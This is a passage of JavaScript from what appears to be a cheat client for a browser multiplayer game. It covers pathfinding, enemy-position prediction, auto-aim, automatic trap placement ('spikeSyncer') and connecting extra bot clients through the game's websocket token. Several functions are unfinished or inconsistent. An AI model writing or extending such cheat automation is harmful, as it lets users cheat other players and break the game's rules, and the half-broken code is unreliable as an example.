    if(p2 < 35 && p3 - 35 < dist) {
        let p4 = calcPoint(x, y, angle, p3 - 35);
        return true;
    } else {
        return false;
    }
}
function isPointWithinRange(center, point, radius) {
    return point <= center + radius / 2 && point >= center - radius / 2 || (center >= 0 ? center + radius / 2 > 3.14 && point <= -3.14 + (center + radius / 2 - 3.14) : center - radius / 2 < -3.14 && point >= 3.14 + (center - radius / 2 + 3.14));
}
function Gd(a, b) {
    return Math.atan2(b.y - a.y, b.x - a.x);
}
class resolveHit{
    constructor(dir, building){
        this.dir = dir;
        this.building = building;
        this.building.players = [];
        let $this = this;
        new Promise(function(resolve, reject){
            $this.resolve = resolve;

            setTimeout(function(){
                reject();
            },111)
        }).then(function(e){
            /*if($this.building.group!=undefined && $this.building.name!="sapling"&&$this.building.name!="mine"){
            }
            if($this.building.owner==null || $this.building.name=="sapling"||$this.building.name=="mine"){
            }*/
            $this.building.health -= e
            $this.remove();
        }).catch(function(){
            $this.remove();
        })
    }
    remove(){
        for(let i = 0;i < hitList.length;i++){
            if(hitList[i] == this){
                hitList.splice(i, 1);
                break;
            }
        }
    }
    attemptResolve(player, hat, tick, proj, isBoss){

        if(proj && this.building.sid == proj.building.sid && tick === this.building.tick){
            this.resolve(this.building.projDmg ? proj.dmg : 0)
        } else if(isBoss && !proj && tick === this.building.tick) {
            // moostafa hit
            //let dir2 = atan2(this.building.y - isBoss.y2, this.building.x - isBoss.x2);
            //let thisDir = getAimer(isBoss, this.building);
            //if((round(dir2 * 10) / 10 == this.dir || dAng(round(dir2 * 10) / 10, this.dir) <= .1005) && dist(isBoss, this.building, "object") <= (210) && C.getAngleDist(thisDir, isBoss.d2) <= gatherAng) {
            this.resolve(200);
            //}
        } else if(!proj && this.building.owner!=null&&this.building.name!="mine"&&this.building.name!="sapling"){
            let dir2 = atan2(this.building.y - player.y2, this.building.x - player.x2);
            let thisDir = getAimer(player,this.building);
            let dst = Math.hypot(player.x2 - this.building.x, player.y2 - this.building.y);
            let prj = {
                x: player.x2 + Math.cos(player.d2) * 35 * (dst > this.building.scale),
                y: player.y2 + Math.sin(player.d2) * 35 * (dst > this.building.scale)
            };
            //console.log(dst, prj, isPointWithinRange(player.d2, Gd(prj, this.building), 3.14));
            // maybe remove dAng(round(dir2 * 10) / 10, this.dir) <= .1005
            if((round(dir2 * 10) / 10 == this.dir || dAng(round(dir2 * 10) / 10, this.dir) <= .1005) /*&& isPointWithinRange(player.d2, Gd(prj, this.building), 3.14)*/ && tick == this.building.tick &&
               dist(player, this.building, "object") <= (R.weapons[player.weaponIndex].range) && C.getAngleDist(thisDir, player.d2) <= gatherAng &&
               !this.building.players.includes(player.sid)){
                this.resolve(Variants[player.weaponVariant] * (hat == 40 ? 3.3 : 1) * (R.weapons[player.weaponIndex].dmg) * (player.weaponIndex == 10 ? 7.5 : 1))
                this.building.players.push(player.sid)
            }
        }

    }
}/*(Math.round(dir2*10)/10==this.dir || dAng(Math.round(dir2*10)/10,this.dir)<=.1005)&&*/

function inRender(e,t){

    //  return <= T.maxScreenWidth / 2 * 1.3 && m <= T.maxScreenHeight / 2 * 1.3
    let height = abs((e.x2||e.x)-(t.x2||t.x))
    let width = abs((e.y2||e.y)-(t.y2||t.y))
    if(height<=T.maxScreenWidth / 2 * 1.3 && width<=T.maxScreenHeight / 2 * 1.3){
        return true;
    }
    return false;
}










const workerScript = "(" + (() => {
    const { sqrt, abs, floor } = Math;
    const { MAX_VALUE } = Number;
    const sqrt2 = sqrt(2);

    const mapSize = 900;
    const intervalSize = 12;
    const interval = intervalSize / 2;

    const cleanMap = JSON.stringify(new Array(Math.round(mapSize / intervalSize)).fill([]));
    const length = JSON.parse(cleanMap).length;

    const points = [0, -1, 0, 1, -1, 0, 1, 0, 1, 1, 1, -1, -1, 1, -1, -1];
    const pointsLength = points.length;

    const colArray = ["boost pad", "teleporter"];

    function calculateDistance(x1, y1, x2, y2) {
        return sqrt((x1 - x2) ** 2 + (y1 - y2) ** 2);
    }

    function calculateCost(x1, y1, x2, y2) {
        const dx = abs(x1 - x2);
        const dy = abs(y1 - y2);
        return ((dx === 0) + (dy === 0)) * intervalSize + (dx !== 0 && dy !== 0) * intervalSize * sqrt2;
    }

    function generateMap(x, y, buildings, tx, ty) {
        let map = JSON.parse(cleanMap),
            targetNode = 0,
            startNode = 0;
        for (let i = 0; i < length; i++) {
            let row = map[i];
            for (let i2 = 0; i2 < length; i2++) {
                let obj = (row[i2] = {
                    x: i * intervalSize - mapSize / 2 + x,
                    y: i2 * intervalSize - mapSize / 2 + y,
                    obstacle: false,
                    available: 1,
                    n: i * length + i2,
                });
                if (
                    obj.x < 0 ||
                    obj.x > 14400 ||
                    obj.y < 0 ||
                    obj.y > 14400
                ) {
                    obj.obstacle = 1;
                    continue;
                }
                for (let e = buildings.length, tmp; e--, (tmp = buildings[e]); ) {
                    if (
                        (obj.obstacle =
                         abs(tmp.x - obj.x) <= tmp.scale2 + 20 &&
                         abs(tmp.y - obj.y) <= tmp.scale2 + 20 &&
                         sqrt((tmp.x - obj.x) ** 2 + (tmp.y - obj.y) ** 2) -
                         tmp.scale2 -
                         20 <=
                         0)
                    )
                        break;
                }
                obj.target = abs(obj.x - tx) <= interval && abs(obj.y - ty) <= interval;
                targetNode = obj.target * obj.n + !obj.target * targetNode;
                obj.start = abs(obj.x - x) <= interval && abs(obj.y - y) <= interval;
                startNode = obj.start * obj.n + !obj.start * startNode;
                obj.fCost = obj.start * -MAX_VALUE;
                obj.gCost = !obj.start * MAX_VALUE;
                //   obj.hCost = calculateDistance(obj.x, obj.y, tx, ty);
                if (obj.target + obj.start > 0) continue;
            }
        }
        return { map: map, targetNode: targetNode, startNode: startNode };
    }

    onmessage = function (message) {
        let { player, target, buildings, clan, } = message.data;
        if (calculateDistance(player.x2, player.y2, target.x, target.y) <= 0)
            return postMessage("reached target");
        let { map, startNode, targetNode } = generateMap(
            player.x2,
            player.y2,
            buildings.filter((building) => {
                building.scale2 =
                    (building.owner == null || building.name == "sapling") && building.type === 0
                    ? building.scale * 0.7
                : building.dmg &&
                    !clan.includes(building?.owner?.sid) &&
                    building?.owner?.sid != player.sid
                    ? building.scale + 40
                : building.type===1&&building.y<12000&&(building.teleport||building.boostSpeed)? building.scale+35:building.do?building.scale:building.scale-10;
                return (
                    (building.ignoreCollision
                     ? building.name === "pit trap"
                     ? building?.owner?.sid != player.sid && !(clan.includes(building.owner?.sid))
                     : building.name === "boost pad" || building.name === "teleporter"
                     : true) &&
                    calculateDistance(building.x, building.y, player.x2, player.y2) < mapSize
                );
            }),
            target.x,
            target.y
        );

        let openNodes = [],
            closedNodes = [],
            currentNode,
            maxIterations = 100000;
        openNodes.push(startNode);
        while (openNodes.length * maxIterations--) {
            let lowest = Infinity,
                index;
            for (let i = openNodes.length, tmp; i--; ) {
                tmp = map[floor(openNodes[i] / length)][openNodes[i] % length];
                if (tmp.fCost < lowest) {
                    currentNode = tmp;
                    lowest = tmp.fCost;
                    index = i;
                }
            }

            openNodes.splice(index, 1);
            closedNodes.push(currentNode.n);

            if (currentNode.target) break;

            for (let i = 0, module; i < pointsLength; i++) {
                module = map[floor(currentNode.n / length) + points[i]]?.[currentNode.n % length + points[i + 1]];
                if (!module || closedNodes.includes(module.n)) continue;
                let gCost = currentNode.gCost + calculateCost(points[i], points[i + 1], 0, 0);
                if (!module.obstacle && module.available === 1) {
                    if (!openNodes.includes(module.n)) {
                        module.parent = currentNode.n;
                        module.gCost = gCost;
                        module.hCost = calculateDistance(module.x, module.y, target.x, target.y);
                        module.fCost = gCost + module.hCost;
                        openNodes.push(module.n);
                    } else if (gCost < module.gCost) {
                        module.parent = currentNode.n;
                        module.gCost = gCost;
                        module.fCost = gCost + module.hCost;
                    }
                }
            }
        }

        if (maxIterations === 0) return postMessage("reached max iterations");
        if (!openNodes.length) return postMessage("couldn't reach target");

        openNodes = [];

        while (!currentNode.start) {
            openNodes.push(currentNode.y, currentNode.x);
            currentNode = map[floor(currentNode.parent / length)][currentNode.parent % length];
        }

        postMessage(openNodes.reverse());
    };
}).toString() + ")();";

var workers = [];
var available = [];

function pathfind(info) {
    return new Promise((resolve, reject) => {
        info = JSON.parse(JSONStringify(info));
        let workerIndex = -1;
        for (let i = 0; i < available.length; i++) {
            if (available[i]) {
                workerIndex = i;
                available[i] = false;
                workers[i].postMessage(info);
                break;
            }
        }
        if (workerIndex === -1) {
            createWorker();
            workerIndex = workers.length - 1;
            available.push(false);
            workers[workerIndex].postMessage(info);
        }

        function onMessage(message) {
            let pathFound = false;
            if (typeof message.data === "string") {
                paths = []
                pathFound = false;
            } else {
                paths = message.data
                pathFound = message.data.length > 0;
            }
            setAvailable(workers[workerIndex]);
            resolve(pathFound);
        }

        function onError(error) {
            reject(error);
        }

        workers[workerIndex].onmessage = onMessage;
        workers[workerIndex].onerror = onError;
    });
}



function createWorker() {
    let worker = new Blob([workerScript]);
    let url = URL.createObjectURL(worker);
    worker = new Worker(url);
    workers.push(worker);
    available.push(true);
}

function setAvailable(worker) {
    for (let i = workers.length; i--; ) {
        if (workers[i] === worker) {
            available[i] = true;
            return;
        }
    }
}

var info,
    generatePathTime;
var paths = [];
//   var enemies = [];
var target;
var lastLength = Infinity;
var logDistance;
var invisMode = 0;
var clanWait = 0;
var websocket;

let enmY;
const wait = async ms => new Promise(action => setTimeout(action, ms))
const connectBot = (code, thebot) => {
    const botUrl = websocket.url.split("token=")[0] + "token=alt%3A" + encodeURIComponent(code);
    console.log(botUrl);
    let ws = new WebSocket(botUrl);

}
function getRandomAng(e,t){
    t = Math.random() * PI2;
    if(e&&dAng(e,t)<=2){
        return getRandomAng(e)
    }
    return t
}
function isInPath(e){
    if(paths.length &&(pusher == false && pushing) && e.name != "pit trap"){
        for(let i = 0; i< paths.length; i+=2){
            if(dist({x:paths[i],y:paths[i+1]},e)<=e.scale-7.5){
                return true;
            }
        }

    }
    return false;
}
function moveToPath(time,distance, x){
    if (paths && paths.length && (keys.z || pusher==false&&pushing)) {
        let spliceIndex = 0,startIndex=0;;
        if(pushing&&paths.length*7>=distance) return;
        while (startIndex < paths.length) {
            const pointX = paths[startIndex];
            const pointY = paths[startIndex + 1];
            const distanceToPlayer = sqrt((E.x2 - pointX) ** 2 + (E.y2 - pointY) ** 2);
            let threshold = x ? 10 : 35
            if (distanceToPlayer <= threshold) {
                spliceIndex += 2;
            } else{
                if(!pushing) break;
            }
            if(pushing&&distanceToPlayer>distance){
                return false
            }
            startIndex += 2;
        }

        if (spliceIndex + 2 < paths.length) {
            const nextPoint = { x: paths[spliceIndex], y: paths[spliceIndex + 1] };
            knla.send("9", getAimer(E, nextPoint),'pathfinder');
            paths.splice(0, spliceIndex);
        }
    }
    //console.log(Date.now()-time,"generate time")
    return true;
}
function randomItem(e){
    e = round(Math.random()*E.items.length-1)
    if(e == 0) return randomItem()
    return e
}
function sortPlayers(e,merge,ids =[]){
    for(let i=0;i<e.length;i+=13){
        ids.push(e[i])
        for(let f=0;f<merge.length;f+=13){
            if(ids.includes(merge[f]))merge.splice(f,13);
        }
    }
    return e.concat(merge)
}
urls = R.list;


function findLoadout2(e, t, dirs, type, d, s = [], v = [], p, range = R.weapons[primary].range, prange = R.projectiles[1].range + 35) {
    // _,time,ang,set
    const base = {
        buildIndex: -1,
        weaponIndex: 0,
        skinIndex: [e, 53, 7][type] || 0,
        tailIndex: 0,
        y: E.y2,
        zIndex: null,
        sid: E.sid,
    };
    type == 2 ? p = 2 : p = 3;
    Array.from({ length: p }, (_, i) => {
        s[i] = {
            ...base,
            ...(type === 0 || type === 1 ? { weaponIndex: [secondary, primary, primary][i], buildIndex: i === 2 ? 3 : -1 } : {}),
            ...(type === 2 ? { tailIndex: i === 0 ? 19 : 0, weaponIndex: primary } : {}),
        };
    });

    const cV = (i, tI, y, set, x, obj, arr = []) => {
        !set && (set = E);
        for(let H = 0; H < dirs.length; H++){
            const next = bTw(set, 111, dirs[H], { ...s[i] });
            console.log(type,set,dirs[H],{ ...s[i] })
            x = y ? next.decel : next.accel;
            //   console.log(next)
            const distance = type === 2 ? dist(x, nearestenemy.np.real,"player") : dist(x, nearestenemy.np.real);
            console.log(dirs[H]);
            obj = {
                pos:  next ,
                move: y ? undefined : dirs[H],
                ...s[i],
                distance,
                x2: x.x,
                y2: x.y,
                sid: E.sid,
                xVel: next.xVel,
                yVel: next.yVel,
                type: y ? 'decel' : 'accel',
            };
            obj.t1 = type == 0 ? obj : set.t1 ? set.t1 : 0;
            obj.t2 = type == 1 ? obj : set.t2 ? set.t2 : 0;
            if(type == 2) obj.t3 = obj;
            //arr.push(obj)
            (!type||type === 1) && distance >= prange &&v.push(obj);
            type === 2 && distance <= range && v.push(obj);
        }
        //  return;
        //  return arr
    };


    looper: for (const tI of speedTails) {
        if(tI == 11 && type === 2) continue looper;
        for (let O = 0; O < p; O++) {
            s[O].tailIndex = tI;
            d ? d.forEach((_X) => cV(O, tI, false, _X)) : cV(O, tI)
        }
    }









    //  v = v.flat()
    //    console.log(v)
    console.log(v)
    console.log("move", v.move);
    if(!type) return v//.filter(({ distance }) => distance >= t);
    if(type === 1) return findLoadout(7, range, dirs, 2, v)//.filter(({ distance }) => distance >= t));
    let avgr = prange + range
    // a = v.filter(({ distance }) => distance <= range)
    v.length ? v = v.reduce((b, c) => {
        const s = c.t2.distance + c.t3.distance;
        const cS = b.t2.distance + b.t3.distance;
        const cD = Math.abs(cS - avgr);
        const curD = Math.abs(s - avgr);
        if (curD < cD) {
            return c;
        } else {
            return b;
        }
    }) : v = null;
    return v;
}
// Helper function to create base loadouts
function createBaseLoadout(weaponIndex, buildIndex, skinIndex = 53) {
    return {
        buildIndex: buildIndex,
        weaponIndex: weaponIndex,
        skinIndex: skinIndex,
        tailIndex: 0,
        y: E.y2,
        zIndex: null
    };
}

// Helper function to calculate velocities
function calculateVelocities(pos, move, tailIndex, baseLoadout) {
    const loadout = { ...baseLoadout, tailIndex };
    pos = JSON.parse(JSON.stringify(pos));
    console.log(pos);
    const velocity = bTw(pos, 111, move, loadout);
    return {
        ...loadout,
        x2: velocity.accel.x,
        y2: velocity.accel.y,
        dist: dist(velocity.accel, pos),
        xVel: pos.xVel,
        yVel: pos.yVel,
        sid: E.sid
    };
}

function findLoadoutTest(e, t, dir, s = [], v = [], x) {
    // Create initial loadouts
    s[0] = createBaseLoadout(primary, -1, e);
    s[1] = createBaseLoadout(secondary, -1, e);
    s[2] = createBaseLoadout(E.primary, 3, e);

    x = nearestenemy.np.real;

    // Calculate velocities and distances for each loadout
    for (let i = 0; i < 3; i++) {
        v[i] = { pos: bTw(E, 111, getAimer(E, nearestenemy), s[i]), move: dir, loadout: s[i] };
        v[i].dist = dist(v[i].pos.accel, x);
        v[i].x2 = v[i].pos.accel.x;
        v[i].y2 = v[i].pos.accel.y;
    }

    if (speedTails.includes(11)) {
        for (let i = 0; i < 3; i++) {
            s[i].tailIndex = 11;
            v[i + 3] = { pos: bTw(E, 111, getAimer(E, nearestenemy), s[i]), move: dir, loadout: s[i] };
            v[i + 3].dist = dist(v[i + 3].pos.accel, x);
            v[i + 3].x2 = v[i + 3].pos.accel.x;
            v[i + 3].y2 = v[i + 3].pos.accel.y;
        }
    }

    if (speedTails.includes(19)) {
        for (let i = 0; i < 3; i++) {
            s[i].tailIndex = 19;
            v[i + 6] = { pos: bTw(E, 111, getAimer(E, nearestenemy), s[i]), move: dir, loadout: s[i] };
            v[i + 6].dist = dist(v[i + 6].pos.accel, x);
            v[i + 6].x2 = v[i + 6].pos.accel.x;
            v[i + 6].y2 = v[i + 6].pos.accel.y;
        }
    }

    // Filter the results based on distance
    v = v.filter(e => e.dist >= t);
    console.log(`Loadouts ${v}`);
    return v;
}

function tGCalc(t, z, loadouts = [], x = []) {
    // Create initial loadouts
    for (let i = 0; i < 3; i++) {
        x[i] = createBaseLoadout(i === 0 ? secondary : primary, i === 2 ? 3 : -1);
    }

    const q = { pos: E/*.np.decel*/, move: undefined };
    console.log(x);
    q.dist = dist(q.pos, x);
    q.x2 = q.pos.x;
    q.y2 = q.pos.y;
    t.push(q);

    for (const e of t) {
        for (let i = 0; i < 3; i++) {
            loadouts.push(calculateVelocities(e.pos, e.move, 0, x[i]));
            loadouts.push(calculateVelocities(e.pos, e.move, 11, x[i]));
        }

        if (speedTails.includes(19)) {
            for (let i = 0; i < 3; i++) {
                loadouts.push(calculateVelocities(e.pos, e.move, 19, x[i]));
            }
        }
    }

    return loadouts;
}

function bHCalc(t, z, loadouts = [], x = []) {
    // Create initial loadouts
    for (let i = 0; i < 2; i++) {
        x[i] = createBaseLoadout(primary, -1, 53);
        x[i].tailIndex = i === 0 ? 19 : 0;
    }

    const q = { pos: E/*.np.decel*/, move: undefined };
    q.dist = dist(q.pos, x);
    q.x2 = q.pos.x;
    q.y2 = q.pos.y;
    t.push(q);
    console.log(q); /// get rid of E.np.decel and make it E
    for (const e of t) {
        for (let i = 0; i < 3; i++) {
            loadouts.push(calculateVelocities(e.pos, e.move, 0, x[i]));
            loadouts.push(calculateVelocities(e.pos, e.move, 11, x[i]));
        }

        if (speedTails.includes(19)) {
            for (let i = 0; i < 3; i++) {
                loadouts.push(calculateVelocities(e.pos, e.move, 19, x[i]));
            }
        }
    }

    return loadouts;
}

// Connect the pieces
function mainFunction(e, t, dir) {
    let loadouts = [];
    let finalLoadouts = findLoadoutTest(e, t, dir);
    console.log(finalLoadouts);
    finalLoadouts = tGCalc(finalLoadouts, null, loadouts);
    finalLoadouts = bHCalc(finalLoadouts, null, loadouts);
    return finalLoadouts;
}
function findLoadout(e, t, dirs, type, d,v = []) {
    const base = {
        buildIndex: -1,
        weaponIndex: 0,
        skinIndex: [e, 53, 7][type] || 0,
        tailIndex: 0,
        y: E.y2,
        zIndex: null,
        sid: E.sid,
    };

    const p = type === 2 ? 2 : 3;
    const s = Array.from({ length: p }, (_, i) => ({
        ...base,
        ...(type === 0 || type === 1 ? { weaponIndex: [secondary, primary, primary][i], buildIndex: i === 2 ? 3 : -1 } : {}),
        ...(type === 2 ? { tailIndex: i === 0 ? 19 : 0, weaponIndex: primary } : {}),
    }));

    const calcVelocities = (i, tI, y, set) => {
        //console.log(set);
        const setObj = !set ? E : { t1: set.t1 || 0, t2: set.t2 || 0, t3: type === 2 ? set : 0 };
        //console.log(setObj, setObj);
        for (const dir of dirs) {
            const next = bTw(E/*!set ? E : set*/, dir, { ...s[i] });
            let nxt = y ? next.decel : next.accel;
            (!type || type === 1) && null //console.log(dist(nxt, nearestenemy.np.real));
            const distance = type === 2 ? dist(nxt, nearestenemy.np.real, 'player') : dist(nxt, nearestenemy.np.real/*, 'player'*/);
            let obj = {
                pos: next,
                move: y ? undefined : dir,
                ...s[i],
                distance,
                x2: next.x,
                y2: next.y,
                sid: E.sid,
                xVel: next.xVel,
                yVel: next.yVel,
                type: y ? 'decel' : 'accel',
                ...setObj
            };
            //console.log(`distance: ${distance}`);
            ((!type || type === 1) && (distance >= R.projectiles[1].speed*111+35)) && v.push(obj); // R.projectiles[1].speed*111+35
            type === 2 && distance <= R.weapons[primary].range && v.push(obj);
        }
    };

    for (const tI of speedTails) {
        if (tI == 11 && type === 2) continue;
        for (let O = 0; O < p; O++) {
            s[O].tailIndex = tI;
            d ? d.forEach((_X) => calcVelocities(O, tI, false, _X)) : calcVelocities(O, tI);
        }
    }

    if (!type) return v;
    if (type === 1) return findLoadout(7, R.weapons[primary].range, dirs, 2, v);

    const avgr = (R.projectiles[1].speed*111+35)/*R.projectiles[1].range*/ + R.weapons[primary].range;
    v.length && (v = v.reduce((b, c) => {
        const s = c.t2.distance + c.t3.distance;
        const cS = b.t2.distance + b.t3.distance;
        const cD = Math.abs(cS - avgr);
        const curD = Math.abs(s - avgr);

        return curD < cD ? c : b;
    }));

    return v || null;
}

// ORIGIAL VERSION WITH ERORR
function findLoadoutOrig(e, t, dirs, type, d,v = []) {
    const base = {
        buildIndex: -1,
        weaponIndex: 0,
        skinIndex: [e, 53, 7][type] || 0,
        tailIndex: 0,
        y: E.y2,
        zIndex: null,
        sid: E.sid,
    };

    const p = type === 2 ? 2 : 3;
    const s = Array.from({ length: p }, (_, i) => ({
        ...base,
        ...(type === 0 || type === 1 ? { weaponIndex: [secondary, primary, primary][i], buildIndex: i === 2 ? 3 : -1 } : {}),
        ...(type === 2 ? { tailIndex: i === 0 ? 19 : 0, weaponIndex: primary } : {}),
    }));
    const calcVelocities = (i, tI, y, set) => {
        // const setObj = { tick1: set.tick1 || 0, tick2: set.tick2 || 0, tick3: type === 2 ? set : 0 };
        for (const dir of dirs) {
            const next = bTw(E, 111, dir, { ...s[i] });
            const typ = y ? next.decel : next.accel;
            const distance = type === 2 ? dist(typ, nearestenemy.np.real, 'player') : dist(typ, nearestenemy.np.real);
            console.log("next", next, "dist", distance, "dir", dir);
            console.log(y ? 'decel' : 'accel');
            const obj = {
                pos: next,
                move: y ? undefined : dir,
                ...s[i],
                distance,
                x2: typ.x,
                y2: typ.y,
                sid: E.sid,
                xVel: next.xVel,
                yVel: next.yVel,
                type: y ? 'decel' : 'accel',
            };
            //console.log("obj", obj);
            obj.tick1 = type == 0 ? obj : E.tick1 ? E.tick1 : 0;
            obj.tick2 = type == 1 ? obj : E.tick2 ? E.tick2 : 0;
            if(type == 2) obj.tick3 = obj;
            (!type || type === 1) && distance >= R.projectiles[1].range + 35 && v.push(obj);
            type === 2 && distance <= R.weapons[primary].range && v.push(obj);
            console.log("v", v);
        }
    };

    for (const tI of speedTails) {
        if (tI == 11 && type === 2) continue;
        for (let O = 0; O < p; O++) {
            s[O].tailIndex = tI;
            d ? d.forEach((_X) => calcVelocities(O, tI, false, _X)) : calcVelocities(O, tI);
        }
    }

    if (!type) return v;
    if (type === 1) return findLoadout(7, R.weapons[primary].range, dirs, 2, v);

    const avgr = R.projectiles[1].range + R.weapons[primary].range;
    v.length && (v = v.reduce((b, c) => {
        const s = c.tick2.distance + c.tick3.distance;
        const cS = b.tick2.distance + b.tick3.distance;
        const cD = abs(cS - avgr);
        const curD = abs(s - avgr);

        return curD < cD ? c : b;
    }));

    return v || null;
}

function velToPosition(a = [], iteration = 0, info, finisher) {
    if (!nearestenemy) return;

    const base = {
        buildIndex: -1,
        weaponIndex: E.weaponIndex,
        skinIndex: E.skinIndex,
        tailIndex: E.tailIndex,
        y: E.y2,
        zIndex: null,
        sid: E.sid,
    };

    const projPos = JETXRAH(nearestenemy, 3, nearestenemy.movDir);
    const looping = (iteration === 0 ? speedHats.concat([19], [0]) : iteration === 1 ? [53] : [7]);
    const dirs = [getAimer(E, nearestenemy), getAimer(nearestenemy, E), getAimer(E, projPos[2].real), getAimer(projPos[2].real, E), undefined];
    const weps = [primary, secondary, [wallType]];
    let position;
    const getOrder = function (e, t, x) {
        console.log(e, t, x);
        e.tick = tick + iteration;
        e.skinIndex = x.skinIndex;
        e.tailIndex = x.tailIndex;
        e.weaponIndex = x.weaponIndex;
        e.buildIndex = x.buildIndex;
        e.xVel = e.xVel;
        e.yVel = e.yVel;
        e.x2 = e.real.x; // not x.
        e.y2 = e.real.y; // not x.
        e.moveAngle = t;
        e.distance = (iteration === 2 ? dist(e, projPos[2], 'player') : dist(e, projPos[iteration]));
        console.log(iteration, dist(e, projPos[2], 'player'), dist(e, projPos[iteration]));
        //console.log(e.moveAngle, e.distance, e.skinIndex, e.tailIndex, e.weaponIndex, e.buildIndex);
    }
    for (let i = 0; i < looping.length; i++) {
        for (let x = 0; x < dirs.length; x++) {
            for (let v = 0; v < weps.length; v++) {
                const equip = { ...base };

                if (!Array.isArray(looping[i])) {
                    equip.skinIndex = looping[i];
                    equip.weaponIndex = (iteration === 2 ? primary : weps[v]);
                    equip.buildIndex = (!Array.isArray(weps[v]) || iteration === 2) ? -1 : wallType;
                    position = bTw(E, dirs[x], equip);
                } else {
                    equip.tailIndex = looping[i][0];
                    equip.weaponIndex = (!Array.isArray(weps[v])) ? weps[v] : E.weaponIndex;
                    equip.buildIndex = (Array.isArray(weps[v])) ? wallType : -1;
                    position = bTw(E, dirs[x], equip);
                }

                if ((iteration === 1 && dist(position.real, projPos[1].real) > R.projectiles[1] * 111 - 35) ||
                    (iteration === 2 && dist(position.real, projPos[2].real, 'player') <= R.weapons[primary].range) ||
                    (iteration === 0)) {
                    a.push(position);
                    getOrder(position, dirs[x], equip); // Call getOrder here
                }
            }
        }
    }
}



/*function velToPos(conditions, target, currentIteration = 0, maxIterations = 4){
    const base = {
        buildIndex: -1,
        weaponIndex: null,
        skinIndex: null,
        tailIndex: null,
        y: E.y2,
        zIndex: null,
        sid: E.sid,
    }
    const looping = speedHats.concat([19], [0])
    for(let XX = 1; XX < conditions.length + currentIteration; XX++){
        const projPos = JETXRAH(target, XX, target.movDir)
        const dirs = [getAimer(E, target), getAimer(nearestenemy, E), getAimer(E, projPos[XX-1].real), getAimer(projPos[XX-1].real, E), undefined];
        for(let i = 0; i < conditions.length; i++){
            let current = conditions[i]


            }
    }
    const findNext = function(e,t){

        //  calcVel(E)
    }
    }*/



function velToPos(conditions, target, currentIteration = 0, maxIterations = 4, loadout = { hat: null, tail: null, weapon: null }, positions = []) {
    const base = {
        buildIndex: -1,
        weaponIndex: null,
        skinIndex: null,
        tailIndex: null,
        y: E.y2,
        zIndex: null,
        sid: E.sid,
    };

    const looping = speedHats.concat([19], [0]);

    if (currentIteration < maxIterations) {
        const projPos = JETXRAH(target, currentIteration, target.movDir);
        const dirs = [getAimer(E, target), getAimer(nearestenemy, E), getAimer(E, projPos[currentIteration - 1].real), getAimer(projPos[currentIteration - 1].real, E), undefined];
        function bTw(_,ang,set,docalc,time = 111){
            looping.forEach((hatOrTail) => {
                dirs.forEach((direction) => {
                    const newLoadout = { ...loadout, skinIndex: hatOrTail, tailIndex: hatOrTail };

                    /*  // Check hat and tail restrictions
                if (isValidLoadout(newLoadout, conditions)) {
                    conditions.forEach((currentCondition) => {
                        const distance = dist2(projPos[currentIteration - 1], currentCondition.position);

                        if (currentCondition.operator === '<=' && distance <= currentCondition.value) {
                            newLoadout.weapon = currentCondition.weapon;

                            // Check weapon restrictions
                            if (isValidLoadout(newLoadout, conditions)) {
                                positions.unshift(projPos[currentIteration - 1]);
                                velToPos(conditions, target, currentIteration + 1, maxIterations, newLoadout, positions);
                            }
                        } else if (currentCondition.operator === '>=' && distance >= currentCondition.value) {
                            // Similar logic as above
                        }
                    });
                }*/
                });
            });
        }

        // Return the final positions array when reaching the last iteration
        if (currentIteration === maxIterations) {
            console.log("Final positions:", positions);
        }

        function tempLoadout(current, hat, tail, x, y, xVel, yVel){
            let temp = {...current}
            current.x2 = x
            current.y2 = y
            current.xVel = xVel
            current.yVel = yVel
            current.skinIndex = hat
            current.tailIndex = tail
            return current;
        }
    }
}








function pAC(e,t,n,i,p){
    i = hitEnemy(e,t,n)
    i&&(p=true)
    i = hitEnemy(e,t+toRad(15),n)
    i&&(p=true)
    i = hitEnemy(e,t-toRad(15),n)
    i&&(p=true)
    i = hitEnemy(e,t+toRad(30),n)
    i&&(p=true)
    i = hitEnemy(e,t-toRad(30),n)
    i&&(p=true)
    i = hitEnemy(e,t+toRad(45),n)
    i&&(p=true)
    i = hitEnemy(e,t-toRad(45),n)
    i&&(p=true)
    if(p) return true;
    return false
}




function hitEnemy(e, t, n, i) {
    i = (35 + e.scale + (e.placeOffset || 0));
    let l = nearestenemy.x2-(E.x2+cos(t)*i)
    , h = nearestenemy.y2-(E.y2+sin(t)*i)
    , u = 35 + e.scale
    , placer = ue.checkItemLocation3(E.x2 + cos(t) * i, E.y2 + sin(t) * i, e.scale, .6, e.id,false)
    if(n && placer) {
        if ((abs(l) <= u || abs(h) <= u)&&dist(nearestenemy,E)<=35+n.scale) {
            place(e.id, t)
            return true;
        }
    }
    return false;
};




function spikeSyncer(e, t, n, aimer) {
    if (!nearestenemy|| !document.getElementById("ABS").checked|| E.pr != 1 || wr_obj ||/*(primary != 5 || primary != 4 || primary != 3)||*/oneTick) return;
    if(primary == 3 || primary == 4 || primary == 5) {
        for (let i = spikeSync.length - 1; i >= 0; i--) {
            e = spikeSync[i];

            if (!inRender(E, e)) {
                spikeSync.splice(i, 1);
                continue;
            }

            t = ue.checkItemLocation2(e.x, e.y, R.list[spikeType].scale, 0.6, e.id, false);

            if (!t) {
                spikeSync.splice(i, 1);
                continue;
            }
            console.log(e);
            if (t && !wr_obj && dist(E, e) <= 126 &&dist(nearestenemy,e)<=e.scale+35&& dist(E, nearestenemy, "player") <= R.weapons[primary].range) {
                n = polePlacer/*pAC*/(R.list[spikeType], getAimer(E, e), e);
                console.log("n", n);
                if (!n) {
                    spikeSync.splice(i, 1);
                    continue;
                }
                spikeSync.splice(i, 1);
                place(E.items[2], getAimer(E, e));
                wr_obj = true;
                aimer = getAimer(E, nearestenemy);
                aim[0] = aimer;
                knla.send("D", aimer, "client");
                visAim = true;
                Hg(7, 18);
                hold = primary;
                knla.send("z", primary, true);
                setTimeout(() => {
                    wr_obj = false;
                    visAim = false;
                    hold = null;
                }, 111);
            }
        }
        spikeSync = [];
    }
}







function checkPlace(e, t, n,build, i) {
    i = (35 + e.scale + (e.placeOffset || 0));
    let l = nearestenemy.x2-(E.x2+cos(t)*i)
    , h = nearestenemy.y2-(E.y2+sin(t)*i)
    , u = 35 + e.scale
    , placer = ue.checkItemLocation4(E.x2 + cos(t) * i, E.y2 + sin(t) * i, e.scale, .6, n.id,false,n)
    if(n && placer) {
        if ((abs(l) <= u || abs(h) <= u)&&dist(nearestenemy,n)<=n.scale+35) {
            //place(e, t)
            return true;
        }
    }
    return false;
};








function polePlacer(e,t,n,i,p){
    i = checkPlace(e,t,n)
    i&&(p=true)
    i = checkPlace(e,t+toRad(15),n)
    i&&(p=true)
